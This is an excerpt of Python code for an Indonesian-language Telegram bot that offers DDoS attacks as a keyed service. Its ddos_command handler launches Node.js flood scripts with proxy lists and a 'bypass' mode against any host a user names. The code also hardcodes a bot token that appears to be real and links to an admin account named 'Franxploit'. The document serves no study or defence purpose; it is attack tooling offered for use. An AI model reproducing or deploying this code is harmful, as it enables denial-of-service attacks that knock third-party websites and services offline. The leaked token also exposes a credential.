...
bot_token = '6753784877:AAECv9cdfWx0DURdH9kKYsMTVTGIofC86vY' 
...
def ddos_command(message):
    ...
    if user_id not in allowed_users:
        bot.reply_to(message, text='Silakan masuk Key\nGunakan perintah /getkey mendapatkan kembali Key')
        return
    ...
    command = ["node", "TLSCLF.js", host, "250", "100", "10", "proxy.txt"]
    duration = 250
    command = ["node", "skibidi.js", host, "250", "100", "5", "proxy.txt", "bypass"]
    duration = 250
...
def send_admin_link(message):
    bot.reply_to(message, "Telegram: https://t.me/Franxploit")
